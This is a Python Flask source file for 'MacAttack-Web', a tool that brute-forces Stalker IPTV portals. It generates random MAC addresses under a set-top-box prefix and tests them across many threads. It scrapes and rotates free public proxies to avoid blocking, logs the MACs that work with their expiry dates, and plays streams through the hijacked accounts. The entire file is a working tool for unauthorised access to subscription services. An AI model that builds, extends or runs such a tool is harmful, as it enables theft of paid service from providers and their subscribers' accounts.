"""
MacAttack-Web - Web-based MAC Address Testing Tool for Stalker Portals
A Flask-based Linux/Docker version of MacAttack with Web UI
"""
import os
import json
import logging
import random
import time
import threading
import secrets
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import contextmanager

from flask import Flask, render_template, request, jsonify, Response
import requests
import waitress

import stb

# Version
VERSION = "1.0.0"

# Logging setup
logger = logging.getLogger("MacAttack")
logger.setLevel(logging.INFO)
logFormat = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")

# Docker-optimized paths
if os.getenv("CONFIG"):
    configFile = os.getenv("CONFIG")
    log_dir = os.path.dirname(configFile)
else:
    log_dir = "./data"
    configFile = os.path.join(log_dir, "macattack.json")

os.makedirs(log_dir, exist_ok=True)
os.makedirs("./logs", exist_ok=True)

log_file_path = os.path.join("./logs", "macattack.log")
fileHandler = logging.FileHandler(log_file_path)
fileHandler.setFormatter(logFormat)
logger.addHandler(fileHandler)

consoleHandler = logging.StreamHandler()
consoleHandler.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
logger.addHandler(consoleHandler)

# Flask app
app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)

# Host configuration
host = os.getenv("HOST", "0.0.0.0:8080")
logger.info(f"Server will start on http://{host}")

# Global state
config = {}
attack_state = {
    "running": False,
    "paused": False,
    "tested": 0,
    "hits": 0,
    "errors": 0,
    "current_mac": "",
    "found_macs": [],
    "logs": [],
    "start_time": None,
    "threads": []
}

proxy_state = {
    "fetching": False,
    "testing": False,
    "proxies": [],
    "working_proxies": [],
    "logs": []
}

# Default settings
defaultSettings = {
    "speed": 10,
    "timeout": 10,
    "use_proxies": False,
    "proxy_rotation": True,
    "mac_prefix": "00:1A:79:",
    "output_format": "mac_only",
    "auto_save": True,
}


def load_config():
    """Load configuration from file."""
    global config
    try:
        with open(configFile) as f:
            config = json.load(f)
        logger.info(f"Config loaded from {configFile}")
    except FileNotFoundError:
        logger.warning("No config found, creating default")
        config = {}
    except Exception as e:
        logger.error(f"Error loading config: {e}")
        config = {}
    
    config.setdefault("settings", {})
    config.setdefault("found_macs", [])
    config.setdefault("proxies", [])
    
    for key, default in defaultSettings.items():
        config["settings"].setdefault(key, default)
    
    save_config()
    return config


def save_config():
    """Save configuration to file."""
    try:
        with open(configFile, "w") as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving config: {e}")


def get_settings():
    """Get current settings."""
    if not config:
        load_config()
    return config.get("settings", defaultSettings)


def generate_mac(prefix="00:1A:79:"):
    """Generate a random MAC address with given prefix."""
    suffix = ":".join([f"{random.randint(0, 255):02X}" for _ in range(3)])
    return f"{prefix}{suffix}"


def add_log(state, message, level="info"):
    """Add a log message to state."""
    timestamp = datetime.now().strftime("%H:%M:%S")
    state["logs"].append({
        "time": timestamp,
        "level": level,
        "message": message
    })
    # Keep only last 500 logs
    if len(state["logs"]) > 500:
        state["logs"] = state["logs"][-500:]


@contextmanager
def no_proxy_environment():
    """Context manager to temporarily unset proxy environment variables."""
    original_http = os.environ.get("http_proxy")
    original_https = os.environ.get("https_proxy")
    try:
        if "http_proxy" in os.environ:
            del os.environ["http_proxy"]
        if "https_proxy" in os.environ:
            del os.environ["https_proxy"]
        yield
    finally:
        if original_http:
            os.environ["http_proxy"] = original_http
        if original_https:
            os.environ["https_proxy"] = original_https


# ============== ROUTES ==============

@app.route("/")
def index():
    """Main page."""
    return render_template("index.html", version=VERSION)


@app.route("/api/settings", methods=["GET", "POST"])
def api_settings():
    """Get or update settings."""
    if request.method == "GET":
        return jsonify(get_settings())
    
    data = request.json
    settings = get_settings()
    
    for key in data:
        if key in settings:
            settings[key] = data[key]
    
    config["settings"] = settings
    save_config()
    
    return jsonify({"success": True, "settings": settings})


@app.route("/api/attack/start", methods=["POST"])
def api_attack_start():
    """Start MAC attack."""
    global attack_state
    
    if attack_state["running"]:
        return jsonify({"success": False, "error": "Attack already running"})
    
    data = request.json
    portal_url = data.get("url", "").strip()
    
    if not portal_url:
        return jsonify({"success": False, "error": "Portal URL required"})
    
    # Normalize URL
    if not portal_url.startswith("http"):
        portal_url = f"http://{portal_url}"
    
    # Reset state
    attack_state = {
        "running": True,
        "paused": False,
        "tested": 0,
        "hits": 0,
        "errors": 0,
        "current_mac": "",
        "found_macs": [],
        "logs": [],
        "start_time": time.time(),
        "portal_url": portal_url,
        "threads": []
    }
    
    add_log(attack_state, f"Starting attack on {portal_url}", "info")
    
    # Start attack thread
    thread = threading.Thread(target=run_attack, args=(portal_url,), daemon=True)
    thread.start()
    attack_state["threads"].append(thread)
    
    return jsonify({"success": True})


@app.route("/api/attack/stop", methods=["POST"])
def api_attack_stop():
    """Stop MAC attack."""
    global attack_state
    attack_state["running"] = False
    attack_state["paused"] = False
    add_log(attack_state, "Attack stopped by user", "warning")
    return jsonify({"success": True})


@app.route("/api/attack/pause", methods=["POST"])
def api_attack_pause():
    """Pause/resume MAC attack."""
    global attack_state
    attack_state["paused"] = not attack_state["paused"]
    status = "paused" if attack_state["paused"] else "resumed"
    add_log(attack_state, f"Attack {status}", "info")
    return jsonify({"success": True, "paused": attack_state["paused"]})


@app.route("/api/attack/status")
def api_attack_status():
    """Get attack status."""
    elapsed = 0
    if attack_state["start_time"]:
        elapsed = int(time.time() - attack_state["start_time"])
    
    return jsonify({
        "running": attack_state["running"],
        "paused": attack_state["paused"],
        "tested": attack_state["tested"],
        "hits": attack_state["hits"],
        "errors": attack_state["errors"],
        "current_mac": attack_state["current_mac"],
        "found_macs": attack_state["found_macs"][-50:],
        "logs": attack_state["logs"][-100:],
        "elapsed": elapsed
    })


def run_attack(portal_url):
    """Run the MAC attack."""
    global attack_state
    
    settings = get_settings()
    speed = settings.get("speed", 10)
    timeout = settings.get("timeout", 10)
    use_proxies = settings.get("use_proxies", False)
    mac_prefix = settings.get("mac_prefix", "00:1A:79:")
    
    proxies = config.get("proxies", []) if use_proxies else []
    proxy_index = 0
    
    add_log(attack_state, f"Attack started with {speed} threads", "info")
    
    with ThreadPoolExecutor(max_workers=speed) as executor:
        futures = {}
        
        while attack_state["running"]:
            # Handle pause
            while attack_state["paused"] and attack_state["running"]:
                time.sleep(0.5)
            
            if not attack_state["running"]:
                break
            
            # Submit new tasks
            while len(futures) < speed and attack_state["running"]:
                mac = generate_mac(mac_prefix)
                proxy = None
                
                if proxies:
                    proxy = proxies[proxy_index % len(proxies)]
                    proxy_index += 1
                
                future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
                futures[future] = mac
            
            # Process completed futures
            done_futures = []
            for future in list(futures.keys()):
                if future.done():
                    done_futures.append(future)
            
            for future in done_futures:
                mac = futures.pop(future)
                try:
                    success, expiry, message = future.result()
                    attack_state["tested"] += 1
                    attack_state["current_mac"] = mac
                    
                    if success:
                        attack_state["hits"] += 1
                        attack_state["found_macs"].append({
                            "mac": mac,
                            "expiry": expiry,
                            "time": datetime.now().strftime("%H:%M:%S")
                        })
                        add_log(attack_state, f"HIT! {mac} - Expiry: {expiry}", "success")
                        
                        # Save to config
                        config["found_macs"].append({
                            "mac": mac,
                            "expiry": expiry,
                            "portal": portal_url,
                            "found_at": datetime.now().isoformat()
                        })
                        if settings.get("auto_save", True):
                            save_config()
                    
                except Exception as e:
                    attack_state["errors"] += 1
                    add_log(attack_state, f"Error testing {mac}: {str(e)}", "error")
            
            time.sleep(0.01)
    
    attack_state["running"] = False
    add_log(attack_state, f"Attack finished. Tested: {attack_state['tested']}, Hits: {attack_state['hits']}", "info")


def test_mac_worker(portal_url, mac, proxy, timeout):
    """Worker function to test a single MAC."""
    return stb.test_mac(portal_url, mac, proxy, timeout)


# ============== PROXY ROUTES ==============

@app.route("/api/proxies", methods=["GET", "POST", "DELETE"])
def api_proxies():
    """Manage proxies."""
    if request.method == "GET":
        return jsonify({
            "proxies": config.get("proxies", []),
            "state": proxy_state
        })
    
    if request.method == "POST":
        data = request.json
        proxies = data.get("proxies", "").strip().split("\n")
        proxies = [p.strip() for p in proxies if p.strip()]
        config["proxies"] = proxies
        save_config()
        return jsonify({"success": True, "count": len(proxies)})
    
    if request.method == "DELETE":
        config["proxies"] = []
        save_config()
        return jsonify({"success": True})


@app.route("/api/proxies/fetch", methods=["POST"])
def api_proxies_fetch():
    """Fetch proxies from public sources."""
    global proxy_state
    
    if proxy_state["fetching"]:
        return jsonify({"success": False, "error": "Already fetching"})
    
    proxy_state["fetching"] = True
    proxy_state["logs"] = []
    
    thread = threading.Thread(target=fetch_proxies_worker, daemon=True)
    thread.start()
    
    return jsonify({"success": True})


@app.route("/api/proxies/test", methods=["POST"])
def api_proxies_test():
    """Test proxies."""
    global proxy_state
    
    if proxy_state["testing"]:
        return jsonify({"success": False, "error": "Already testing"})
    
    proxy_state["testing"] = True
    proxy_state["logs"] = []
    
    thread = threading.Thread(target=test_proxies_worker, daemon=True)
    thread.start()
    
    return jsonify({"success": True})


@app.route("/api/proxies/status")
def api_proxies_status():
    """Get proxy status."""
    return jsonify(proxy_state)


def fetch_proxies_worker():
    """Fetch proxies from public sources."""
    global proxy_state
    
    sources = [
        "https://spys.me/proxy.txt",
        "https://free-proxy-list.net/",
        "https://www.us-proxy.org/",
        "https://www.sslproxies.org/",
    ]
    
    all_proxies = []
    
    for source in sources:
        try:
            add_log(proxy_state, f"Fetching from {source}", "info")
            with no_proxy_environment():
                response = requests.get(source, timeout=15)
                
                if "spys.me" in source:
                    import re
                    matches = re.findall(r"[0-9]+(?:\.[0-9]+){3}:[0-9]+", response.text)
                    all_proxies.extend(matches)
                else:
                    import re
                    matches = re.findall(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>", response.text)
                    all_proxies.extend([f"{ip}:{port}" for ip, port in matches])
                
                add_log(proxy_state, f"Found {len(matches)} proxies from {source}", "info")
        except Exception as e:
            add_log(proxy_state, f"Error fetching from {source}: {e}", "error")
    
    # Remove duplicates
    all_proxies = list(set(all_proxies))
    proxy_state["proxies"] = all_proxies
    
    add_log(proxy_state, f"Total unique proxies: {len(all_proxies)}", "success")
    proxy_state["fetching"] = False


def test_proxies_worker():
    """Test proxies for validity."""
    global proxy_state
    
    proxies = config.get("proxies", [])
    if not proxies:
        proxies = proxy_state.get("proxies", [])
    
    if not proxies:
        add_log(proxy_state, "No proxies to test", "warning")
        proxy_state["testing"] = False
        return
    
    working = []
    add_log(proxy_state, f"Testing {len(proxies)} proxies...", "info")
    
    def test_proxy(proxy):
        try:
            with no_proxy_environment():
                response = requests.get(
                    "http://httpbin.org/ip",
                    proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
                    timeout=10
                )
                if response.status_code == 200:
                    return proxy, True
        except:
            pass
        return proxy, False
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(test_proxy, p): p for p in proxies}
        
        for future in as_completed(futures):
            proxy, is_working = future.result()
            if is_working:
                working.append(proxy)
                add_log(proxy_state, f"✓ {proxy}", "success")
            else:
                add_log(proxy_state, f"✗ {proxy}", "error")
    
    proxy_state["working_proxies"] = working
    config["proxies"] = working
    save_config()
    
    add_log(proxy_state, f"Done! {len(working)}/{len(proxies)} working", "success")
    proxy_state["testing"] = False


# ============== PLAYER ROUTES ==============

@app.route("/api/player/connect", methods=["POST"])
def api_player_connect():
    """Connect to portal and get playlist."""
    data = request.json
    url = data.get("url", "").strip()
    mac = data.get("mac", "").strip().upper()
    proxy = data.get("proxy", "").strip() or None
    
    if not url or not mac:
        return jsonify({"success": False, "error": "URL and MAC required"})
    
    if not url.startswith("http"):
        url = f"http://{url}"
    
    try:
        token, token_random, portal_type, portal_version = stb.get_token(url, mac, proxy)
        
        if not token:
            return jsonify({"success": False, "error": "Failed to get token"})
        
        # Get categories
        genres = stb.get_genres(url, mac, token, portal_type, proxy)
        vod_cats = stb.get_vod_categories(url, mac, token, portal_type, proxy)
        series_cats = stb.get_series_categories(url, mac, token, portal_type, proxy)
        
        return jsonify({
            "success": True,
            "token": token,
            "portal_type": portal_type,
            "live": [{"id": g["id"], "name": g["title"]} for g in genres],
            "vod": [{"id": c["id"], "name": c["title"]} for c in vod_cats],
            "series": [{"id": c["id"], "name": c["title"]} for c in series_cats]
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/player/channels", methods=["POST"])
def api_player_channels():
    """Get channels from a category."""
    data = request.json
    url = data.get("url", "").strip()
    mac = data.get("mac", "").strip().upper()
    token = data.get("token", "")
    portal_type = data.get("portal_type", "portal.php")
    category_type = data.get("category_type", "IPTV")
    category_id = data.get("category_id", "")
    proxy = data.get("proxy", "").strip() or None
    
    try:
        channels, total = stb.get_channels(url, mac, token, portal_type, category_type, category_id, proxy)
        
        return jsonify({
            "success": True,
            "channels": channels,
            "total": total
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/player/stream", methods=["POST"])
def api_player_stream():
    """Get stream URL for a channel."""
    data = request.json
    url = data.get("url", "").strip()
    mac = data.get("mac", "").strip().upper()
    token = data.get("token", "")
    portal_type = data.get("portal_type", "portal.php")
    cmd = data.get("cmd", "")
    content_type = data.get("content_type", "live")
    proxy = data.get("proxy", "").strip() or None
    
    try:
        if content_type == "vod":
            stream_url = stb.get_vod_stream_url(url, mac, token, portal_type, cmd, proxy)
        else:
            stream_url = stb.get_stream_url(url, mac, token, portal_type, cmd, proxy)
        
        if stream_url:
            return jsonify({"success": True, "stream_url": stream_url})
        else:
            return jsonify({"success": False, "error": "Failed to get stream URL"})
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


# ============== FOUND MACS ==============

@app.route("/api/found", methods=["GET", "DELETE"])
def api_found():
    """Get or clear found MACs."""
    if request.method == "GET":
        return jsonify(config.get("found_macs", []))
    
    if request.method == "DELETE":
        config["found_macs"] = []
        save_config()
        return jsonify({"success": True})


@app.route("/api/found/export")
def api_found_export():
    """Export found MACs."""
    format_type = request.args.get("format", "txt")
    found = config.get("found_macs", [])
    
    if format_type == "json":
        return Response(
            json.dumps(found, indent=2),
            mimetype="application/json",
            headers={"Content-Disposition": "attachment;filename=found_macs.json"}
        )
    else:
        lines = [f"{m['mac']} | {m.get('expiry', 'N/A')} | {m.get('portal', 'N/A')}" for m in found]
        return Response(
            "\n".join(lines),
            mimetype="text/plain",
            headers={"Content-Disposition": "attachment;filename=found_macs.txt"}
        )


# ============== MAIN ==============

if __name__ == "__main__":
    load_config()
    logger.info(f"MacAttack-Web v{VERSION} starting...")
    
    host_parts = host.split(":")
    bind_host = host_parts[0]
    bind_port = int(host_parts[1]) if len(host_parts) > 1 else 8080
    
    logger.info(f"Server running on http://{bind_host}:{bind_port}")
    waitress.serve(app, host=bind_host, port=bind_port)
